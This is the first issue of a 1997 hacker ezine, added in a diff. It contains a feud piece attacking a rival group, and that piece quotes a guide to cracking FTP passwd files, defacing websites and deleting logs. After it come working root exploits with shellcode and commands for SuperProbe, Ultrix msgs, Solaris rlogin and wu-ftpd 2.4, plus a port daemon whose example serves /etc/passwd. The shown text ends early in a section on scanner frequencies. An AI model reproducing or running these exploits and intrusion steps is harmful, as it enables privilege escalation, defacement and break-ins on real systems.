@@ -1,0 +1,752 @@
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+=--------------------=====================================--------------------=
+=--------------------= Status : Confidence Remains High. =--------------------=
+=--------------------=  Issue : 001.                     =--------------------=
+=--------------------=   Date : April 16th  1997.        =--------------------=
+=--------------------=====================================--------------------=
+===============================================================================
+==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+                          .:. Site Of The Month .:.
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+-----------------------> http://micros0ft.paranoia.com <-----------------------
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  In This Issue :
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+ -----=>  Section A  :  Introduction And Cover Story.
+
+ 1. Welcome To Issue 1 Of Confidence Remains High......: Tetsu Khan
+ 2. sIn eXposed........................................: The CodeZero + Friends
+
+ -----=>  Section B  :  Exploits And Code.
+
+ 1. SuperProbe.........................................: Solar Designer
+ 2. Ultrix Exploit.....................................: StatioN
+ 3. Solaris 2.5 / 2.5.1 rlogin Exploit.................: Jeremy Elson
+ 4. wu-ftpd 2.4(1) Exploit.............................: Eugene Schultz
+
+ 5. portmsg.c..........................................: Some FTP Someplace..
+
+ -----=>  Section C  :  Phones / Scanning / Radio.
+
+ 1. Fast Food Restuarant Frequencies...................: Dj Gizmo
+ 2. Robbing Stores With Phones, A Real Example.........: The CrackHouse
+ 3. How To Rewire Your House For Free Phone Calls......: WildFire
+
+ -----=>  Section D  :  Miscellaneous.
+
+ 1. Hacking Electrical Items Part 2, The Sequel........: Tetsu Khan
+ 2. Virus Definitions..................................: so1o
+ 3. Fun With whois, sinnerz.com........................: so1o
+ 4. Hacking Space Shuttles, Abort Codes................: NailGun
+ 5. Country Domain Listing.............................: SirLance
+
+ -----=>  Section E  :  World News.
+
+ 1. CoreWars...........................................: so1o / odİphreak
+ 2. Technophoria Want A Piece Of CodeZero Too?.........: so1o
+ 3. Global kOS Press Release...........................: Spidey
+ 4. www.ncaa.com Hack Makes News.......................: so1o
+ 5. CodeZero To Release sunOS 5.x RootKit..............: so1o
+ 6. Too Many nethosting.com Break-Ins..................: so1o
+ 7. sulfur of #hack to print a bi-monthly magazine.....: so1o
+ 8. 2600 Printers go bust and take $9000 with them.....: so1o
+
+ ------=> Section F  :  Projects.
+
+ 1. IP Spoofing Programs And Utilities.................: Dr_Sp00f
+ 2. Using LinuxRootKitIII..............................: suid
+
+ -----=> Section G  :  The End.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  1. Welcome To Issue 1 Of Confidence Remains High : Tetsu Khan
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+Confidence Remains High will be issued EVERY 50 DAYS as from April 16th...
+It is free, not like 2600, or sulfur's soon to be released Access Denied, which
+both cost *YOU*, the reader MONEY, cash, $$$ etc. which we don't like, because
+information should be free, and so, we bring you Confidence Remains High, with
+news, exploits, scanning, telco, and enough shit to make you wonder "why did I
+ever pay cash for this?!" anyway, on with the show...
+
+==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
+==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
+==================>  http://www.codez.com UP FUCKEN NOW!@#  <==================
+
+Confidence Remains High is issued every 50 days as from April 16th, as then,
+issue 20 will be released on New Years Day 2000 (if we go that far!)
+
+Tetsu Khan.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  2. sIn eXposed : CodeZero + Friends.
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+If you cant be bothered to read all this shit, just go to...
+
+        ---------------> www.sinnerz.com/bible.htm <---------------
+
+                                      ...And view the lameness for yourself :)
+
+-------------------------------------------------------------------------------
+
+Concerning the news in issue 2 of the CodeZero technical journal, we found
+this response (http://www.sinnerz.com/codezero.txt) :
+
+So has anyone here heard of Codezero? Its some ezine type shit that i just 
+wanted to expose as bullshit. I had never heard of it till i talked to 
+darkfool and he showed me... You can check it out at neonunix.org/codezero.
+It is pretty good for a laugh. When me and Banshee and Messiah first read it
+we all were in #sin and the first thing to come to our mind was.. wtf is this?
+Some hacker gossip column or what? Even more funny was the surprise i got 
+when i saw that the editor was Tetsu Khan (so1o who was mentioned earlier
+in the Bible)... that brought a smile to my face to see that. Anyways so 
+i was reading thru issue 2 of codezero and i happend to see a lot of bogus
+information...stuff said that wasn't true. Same with the first issue. 
+Examples our comments like "Infected has some new programs coming out soon
+including Utopia an encryption program by The Messiah." Anyways im doing
+the algorithm for that program with Messiah and it is not going to be out 
+for a long time... Messiah has a lot of plans for the future all coming
+before Utopia does....
+
+Those are the exact, untouched words of HosTiİe of SiN, hmmm, lets examine
+that passage more closely...
+
+  "some ezine type shit that i just wanted to expose as bullshit..."
+
+  "i was reading thru issue 2 of codezero and i happend to see a lot of bogus
+   information...stuff said that wasn't true..."
+
+This is very interesting indeed, that they should care about a small news
+section in the journal isn't it? seeing that we published how many lines about
+them? a whole 20 I hear you say? hmm...doesn't the journal have exploits and
+other stuff in it to? I think it does...
+
+  "Anyways im doing the algorithm for that program with Messiah and it is not
+   going to be out for a long time... Messiah has a lot of plans for the future
+   all coming before Utopia does...."
+
+So then HoStiİe, you can program now? thats new, and *YOU* are coding the
+algorithm? intersting... WAIT! you are saying that Utopia is true? and that
+we did publish correct information? I always thought so, seeing that the truth
+is that you probably wanted your beautiful new program to be a big surpise
+to the "scene"...
+
+Heh, how silly of me to actually think you had a clue! You just can't take it
+that you are stuck in a lame fuck group of wannabes and the truth is finally
+coming out...Let us examine more examples found on www.sinnerz.com :
+
+It also had some shit like "4 new hacks were reported this month" and they
+were right on the 4 new hacks part but they put bogus shit about them.
+The catch22 one they happend to put the html for it.. well they put the
+wrong shit that was on it. Becuz on the catch22 hack Darkfool had put the
+names of all the SIN members on the page. Which they decided to leave out...
+also They put some weird shit which they said was on the 2 hacks Darkfool did.
+Where it was the entersin.gif from our page that was there with a bunch of
+other links. Anyways there is also a lot of other shit that was bullshit in
+both of their issues...
+
+SHoCk HoRRoR !!!! Darkfool was responsible for the www.catch22.com hack ??
+and SiN was linked to the hacks too?? That is interesting news HoSTiİe, seeing
+you just could have landed one of your SiN members in trouble, as CodeZero
+didn't mention any names concerning the catch22.com hack, and the very first
+index.html to go up, which was the one we published was infact very correct,
+its just that the index.html must have changed how many times that day?
+hmmm...
+
+  "...wrong shit that was on it. Becuz on the catch22 hack Darkfool had put the
+   names of all the SIN members on the page. Which they decided to leave out..."
+
+Strange...seeing another hacker, by the name of Sventa, was blamed entirely for
+the attacks. Oh yeah, one last thing, in the index.html that was apparently
+modified by Darkfool of SiN, there were 8 numbers, we know what they stand for,
+SiN doesn't, all will be explained one day, as SiN are cl00less and need a good
+kicking.
+
+Let us continue, with a "hacking guide" taken from www.sinnerz.com :
+--------------------------------------------------------------------
+                          _________  ___  _______      
+   \~=._      _.=~/      /   _____/ |   | \      \       \~=._      _.=~/ 
+    \   ~=__=~   /       \_____  \  |   | /   |   \       \   ~=__=~   /
+     \_.=~  ~=._/        /        \ |   |/    |    \       \_.=~  ~=._/ 
+ _.=~ \        / ~=._   /_______  / |___|\____|__  /    .=~ \        / ~=.
+L------\------/------7          \/               \/   L------\------/------7
+        \    /                                                \    / 
+         \  /             http://www.sinnerz.com               \  /   
+          \/                                                    \/
+
+
+OK, this is my mini guide to the easiest 'hacking' there is ( I think ) if any
+one knows different then mail me and tell me :) .
+
+Most FTP servers have the directory /pub  which stores all the 'public'
+information for you to download. But along side /pub you will probably find
+other directorys such as /bin and /etc    its the /etc  directory which is
+important. In this directory there is normally a file called passwd.  .
+This looks something like this :-
+
+root:7GHgfHgfhG:1127:20:Superuser
+jgibson:7fOsTXF2pA1W2:1128:20:Jim Gibson,,,,,,,:/usr/people/jgibson:/bin/csh
+tvr:EUyd5XAAtv2dA:1129:20:Tovar:/usr/people/tvr:/bin/csh
+mcn:t3e.QVzvUC1T.:1130:20:Greatbear,,,,,,,:/usr/people/mcn:/bin/csh
+mouse:EUyd5XAAtv2dA:1131:20:Melissa P.:/usr/people/mouse:/bin/csh
+
+This is where all the user names and passwords are kept. For example, root is 
+the superuser and the rest are normal users on the site. The bit after the
+word root or mcn such as in this example (EUyd5XAAtv2dA) is the password BUT
+it is encrypted. So you use a password cracker....which you can d/l from
+numerous sites which I will give some URL's to at the end of this document.
+With these password crackers you will be asked to supply a passwd. file which
+you download from the \etc directory of the FTP server and a dictionary file
+which the crackers progam will go through and try to see if it can make any
+match. And as many people use simple passwords you can use a 'normal'
+dictionary file. But when ppl REALLY don't want you to break their machines
+they set their passwords to things such as GHTiCk45 which Random Word
+Generator will create (eventually ). Which is where programs such as Random
+Word Generator come in. ( Sorry just pluging my software )
+
+BTW the bad news is that new sites NORMALLY have password files which look
+like this :-
+
+root:x:0:1:0000-Admin(0000):/:/sbin/sh
+
+The x signifies shadowed - you can't use a cracker to crack it because there's
+nothing there to crack, its hidden somewhere else that you can't get to. x is
+also represented as a * or sometimes a .  Ones like the top example are known
+as un-shadowed password files normally found at places with .org domain or .net
+and prehaps even .edu sites. (Also cough .nasa.gov cough sites).
+
+If you want a normal dictionary file i recommend you go to 
+http://www.globalkos.org and download kOS Krack which 
+has a 3 MEG dictionary file. Then run a .passwd cracking program 
+such as jack the ripper or hades or killer crack ( I recommend ) against the 
+.passwd file and dictionary file. Depending upon the amount of passwords in 
+the .passwd file, the size of the dictionary file and the speed of the processor
+it could be a lengthy process.
+Eventually once you have cracked a password you need a basic knowledge of unix.
+I have included the necassary commands to upload a different index.html file to
+a server :-
+Connect to a server through ftp prefably going through a few shells to hide your
+host and login using the hacked account at the Login: Password: part.
+Then once connected type
+
+dir or list 
+If there's a directory called public_html@ or something similar change
+directory using the Simple dos cd command ( cd public_html )
+
+Then type binary to set the mode to binary transfer ( so you can send images
+if necassary )
+
+Then type put index.html  or whatever the index file is called.
+
+It will then ask which transfer you wish to use, Z-Modem is the best. 
+Select the file at your end you wish to upload and send it.
+Thats it !
+
+If you have root delete any log files too.
+
+Please note that this process varys machine to machine.
+To change the password file for the account ( very mean ) login in through
+telnet and simply type passwd at the prompt and set the password for the
+account to anything you wish.
+
+Thats it....if ya don't understand it read it about 10x if ya still don't
+ask someone else i am too busy with errrr stuff..
+
+Links :-
+http://www.sinnerz.com  Where you got this I hope.
+Stay cool and be somebodys fool everyone
+
+Darkfool
+darkfool@pancreas.com
+http://www.sinnerz.com
+
+---
+
+Ummm, *NEWS FLASH*, lets see shall we, this tells attackers to retrieve the
+passwd file using what?! FTP I hear you scream? well, lets see shall we
+children, gather 'round...
+
+  "Most FTP servers have the directory /pub  which stores all the 'public'
+   information for you to download. But along side /pub you will probably
+   find other directorys such as /bin and /etc    its the /etc  directory
+   which is important. In this directory there is normally a file called
+   passwd.  .   This looks something like this :-"
+
+Oh dear, oh dear, oh dear, lets look at the FACTS :
+
+     Common FTP passwd path : /home/ftp/etc/passwd
+         *REAL* passwd path : /etc/passwd
+
+Hmm, lets see, anyone with a clue would know that the FTP passwd file is not
+real, it is only there to mislead little wannabes, examples iclude members of
+SiN.
+
+We continue...
+
+  "Eventually once you have cracked a password you need a basic knowledge of
+   unix. I have included the necassary commands to upload a different
+   index.html file to a server :-
+   Connect to a server through ftp prefably going through a few shells to hide
+   your host and login using the hacked account at the Login: Password: part.
+   Then once connected type 
+
+   dir or list 
+   If there's a directory called public_html@ or something similar change
+   directory using the Simple dos cd command ( cd public_html )
+
+   Then type binary to set the mode to binary transfer ( so you can send images
+   if necassary )
+
+   Then type put index.html  or whatever the index file is called.
+
+   It will then ask which transfer you wish to use, Z-Modem is the best. 
+   Select the file at your end you wish to upload and send it.
+   Thats it !"
+
+Okay, so now, SiN defines hacking as downloading the /home/ftp/etc/passwd
+which is a decoy, and then proceed to get kOS Krack (last time I checked
+www.globalkos.org was down) and then try to crack the passwd file and
+finally use FTP to upload an index.html? how imaginative and original, pity
+all of this info you have been fed is absolute crap, with a success rate of
+practically zero. One last thing...
+
+  "If you have root delete any log files too."
+
+Umm, but you havent told all our wannabe hackers that read your shit where the
+log files are found, seeing that you have to find them, delete them, then
+touch them, oh yeah, I thought you were using FTP? strange...
+
+Im sure that from these examples we have fowarded to you we have started to
+prove the truth behind SiN, seeing they are actually quite lame wannabes with
+very minimal skills...this has been shown, and we will continue to add to this
+hall of shame for SiN, as until now, no-one has stood up to them, but now it
+is time for a change. Watch this space my friends, Until next time...
+
+T_K
+
+I wish I was in sIn, I dew I dew! I dew!! sIn is 3r33t!! -- so1o
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ EXPLOITS ]=================[ .SECTION B. ]===================[ EXPLOITS ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  1. SuperProbe : Solar Designer
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*
+ * SuperProbe buffer overflow exploit for Linux, tested on Slackware 3.1
+ * by Solar Designer 1997.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+  "\xff\xd4\x31\xc0\x8d\x51\x04\x89\xcf\x89\x02\xb0\x2e\x40\xfc\xae\x75\xfd"
+  "\x89\x39\x89\xfb\x40\xae\x75\xfd\x88\x67\xff\xb0\x0b\xcd\x80\x31\xc0\x40"
+  "\x31\xdb\xcd\x80/"
+  "/bin/sh"
+  "0";
+
+char *get_sp() {
+  asm("movl %esp,%eax");
+}
+
+#define bufsize 8192
+#define alignment 0
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize / 2; i += 4)
+    *(char **)&buffer[i] = get_sp() - 2048;
+  memset(&buffer[bufsize / 2], 0x90, bufsize / 2);
+  strcpy(&buffer[bufsize - 256], shellcode);
+  setenv("SHELLCODE", buffer, 1);
+
+  memset(buffer, 'x', 72);
+  *(char **)&buffer[72] = get_sp() - 6144 - alignment;
+  buffer[76] = 0;
+
+  execl("/usr/X11/bin/SuperProbe", "SuperProbe", "-nopr", buffer, NULL);
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  2. Ultrix Exploit : StatioN
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+This bug has been fixed in OSF, but not in Ultrix.
+It should also work on any system that has the msgs mail alias.
+ 
+$ grep msgs /etc/aliases
+msgs: "|/usr/ucb/msgs -s"
+ 
+Ok, the first thing to do is look in the /usr/msgs directory (or whatever
+the directory is where the msgs files are kept), and see what the next msgs
+file will be (if there is 1 and 2, then the next one is pretty easy to figure
+out).
+ 
+Then, make an executable /tmp/a that like makes a suid shell (this is pretty
+easy to do, if you can't do it, don't consider yourself a hacker).
+ 
+By default, newsyslog executes every 6 days at 4 am, but it depends on the
+setup in crontab.  What it does is age the syslog file (at /usr/adm/syslog.1,
+.2, ..., i think).
+ 
+symlink /usr/msgs/<nextmsg> -> /usr/adm/newsyslog
+ 
+$ telnet
+telnet> o localhost 25
+mail shit, version, etc
+expn msgs
+250 <"| /usr/ucb/msgs -s">
+mail from: <`/tmp/a`>
+rcpt to: msgs
+data
+doesn't matter what you put here
+ .
+ quit
+
+ So now, when it writes to /usr/msgs/<nextmsg>, it will overwrite
+ /usr/adm/newsyslog, and since /usr/adm/newsyslog is a shell script, it will
+ expand `/tmp/a` by executing /tmp/a AS ROOT, giving you an suid shell or
+ whatever /tmp/a does.
+
+From there, just clean up after yourself. StatioN
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  3. Solaris 2.5 / 2.5.1 rlogin Exploit : Jeremy Elson
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/*
+ * rlogin-exploit.c: gets a root shell on most Solaris 2.5/2.5.1 machines
+ * by exploiting the gethostbyname() overflow in rlogin.
+ *
+ * gcc -o rlogin-exploit rlogin-exploit.c
+ *
+ * Jeremy Elson, 
+ * jeremy.elson@nih.gov
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define BUF_LENGTH      8200
+#define EXTRA           100
+#define STACK_OFFSET    4000
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
+"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
+"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
+"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd4\xff\xff";
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode);
+
+  long_p = (u_long *) buf;
+
+  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i < code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+  targ_addr = get_sp() - STACK_OFFSET;
+  for (i = 0; i < EXTRA / sizeof(u_long); i++)
+    *long_p++ = targ_addr;
+
+  printf("Jumping to address 0x%lx\n", targ_addr);
+
+  execl("/usr/bin/rlogin", "rlogin", buf, (char *) 0);
+  perror("execl failed");
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  4. wu-ftpd 2.4(1) Exploit : Eugene Schultz
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+This sploit is a teeny bit outdated, but I have been asked by many people about
+exploiting FTP recently...
+
+This shows you how to use the wuftp2.4(1) hole to gain root.
+------------------------------------------------------------
+
+On the VICTIM system, compile the following C code:           
+---------------------------------------------------
+
+main()
+{
+setuid(0);
+seteuid(0);
+
+system("cp /bin/sh /tmp/suidroot");
+system("chmod a+rwxs /tmp/suidroot");
+}
+
+
+Now create a shell script, called root.sh, that contains the following:
+-----------------------------------------------------------------------
+
+exec a.out      <----- a.out is the name of the compiled C code
+
+
+Now, FTP localhost, login as your account on that system and:
+-------------------------------------------------------------
+
+ftp> quote site exec sh root.sh
+
+Then quit FTP and execute /tmp/suidroot to become root!
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  5. portmsg.c : Some FTP Someplace..
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+/**************************************************************************/
+/*      portmsg - generate a message on a port, then close connection      */
+/*                                                                         */
+/*      Usage:  portmsg file port                                          */
+/*                                                                         */
+/*              When a telnet client connects to the specified port, the   */
+/*              text from the file will be echoed to the user.  After a    */
+/*              short delay the connection will close.                     */
+/*                                                                         */
+/*      eg. portmsg /etc/passwd 666                                        */ 
+/*                                                                         */
+/***************************************************************************/
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/file.h>
+#include <sys/ioctl.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/param.h>
+#include <signal.h>
+#include <sys/wait.h>
+
+wait_on_child()
+{
+    union wait status;
+
+    while (wait3(&status, WNOHANG, (struct rusage *) 0) > 0)
+	;
+}
+
+lostconn()
+{
+    exit(1);
+}
+
+main(argc, argv)
+        int argc;
+        char *argv[];
+{
+    int msgfd, fd, n;
+    struct stat statBuf;
+    int port;
+    char *msg;
+    int sockfd, newsockfd;
+    int addrlen; int opt;
+    struct sockaddr_in tcp_srv_addr;
+    struct sockaddr_in their_addr;
+
+    if (argc != 3) {
+	fprintf(stderr, "Usage: portmsg file port\n");
+	exit(1);
+    }
+
+    port = atoi(argv[2]);
+    if (port == 0) {
+	fprintf(stderr, "error: bad port number [%s]\n", argv[2]);
+	exit(1);
+    }
+    if ((msgfd = open(argv[1], O_RDONLY)) < 0) {
+	fprintf(stderr, "error: cannot open message file [%s]\n", argv[1]);
+	exit(1);
+    }
+    /* read the message */
+    fstat(msgfd, &statBuf);
+    if (statBuf.st_size <= 0) {
+	fprintf(stderr, "error: message file [%s] is empty\n", argv[1]);
+	exit(1);
+    }
+    msg = (char *)malloc(statBuf.st_size);
+    if (read(msgfd, msg, statBuf.st_size) != statBuf.st_size) {
+	fprintf(stderr, "error: cannot read message file [%s]\n", argv[1]);
+	exit(1);
+    }
+
+    /* become a daemon */
+    switch(fork()) {
+    case -1:
+	fprintf(stderr, "error: can't fork\n");
+	exit(1);
+    case 0:
+	break;
+    default:
+	exit(0);
+    }
+    if (setpgrp(0, getpid()) == -1) {
+	fprintf(stderr, "error: can't change process group\n");
+	exit(1);
+    }
+    if ((fd = open("/dev/tty", O_RDWR)) >= 0) {
+	ioctl(fd, TIOCNOTTY, NULL);
+	close(fd);
+    }
+
+    (void)signal(SIGCLD, wait_on_child);
+    bzero((char *) &tcp_srv_addr, sizeof(tcp_srv_addr));
+    tcp_srv_addr.sin_family = AF_INET;
+    tcp_srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    tcp_srv_addr.sin_port = htons(port);
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+	fprintf(stderr, "can't create stream socket\n");
+	exit(-1);
+    }
+    opt = 1;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR,
+		 (char *) &opt, sizeof(opt)) < 0) {
+    perror("setsockopt");
+    exit(1);
+    }
+    if (bind(sockfd, (struct sockaddr *)&tcp_srv_addr,
+	     sizeof(tcp_srv_addr)) < 0) {
+	fprintf(stderr, "can't bind local address\n");
+	exit(-1);
+    }
+    listen(sockfd, 5);
+
+main_again:
+    addrlen = sizeof (their_addr);
+    newsockfd = accept(sockfd, (struct sockaddr *) &their_addr, &addrlen);
+    if (newsockfd < 0) {
+	if (errno == EINTR)
+	    goto main_again;
+	fprintf(stderr, "accept error\n");
+	exit(-1);
+    }
+
+    switch(fork()) {
+    case -1:
+	fprintf(stderr, "server can't fork\n");
+	exit(-1);
+    case 0:
+	dup2(newsockfd, 0);
+	dup2(newsockfd, 1);
+	for (n = 3; n < NOFILE; n++)
+	    close(n);
+	break;
+    default:
+	close(newsockfd);
+	goto main_again;
+    }
+
+    /* daemon child arrives here */
+    (void)signal(SIGPIPE, lostconn);
+    (void)signal(SIGCHLD, SIG_IGN);
+
+    fprintf(stdout, msg);
+    (void)fflush(stdout);
+    sleep(5);
+    exit(0);
+}
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+===============================================================================
+==[ FONES / SCANNING ]=========[ .SECTION C. ]===========[ FONES / SCANNING ]==
+===============================================================================
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+  1. Fast Food Restuarant Frequencies : Dj Gizmo
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+If you got a scanner and or transciever that works with these frequencies, then
+you could have some serious phun...
+
+-------------------------------------------------------------------------------
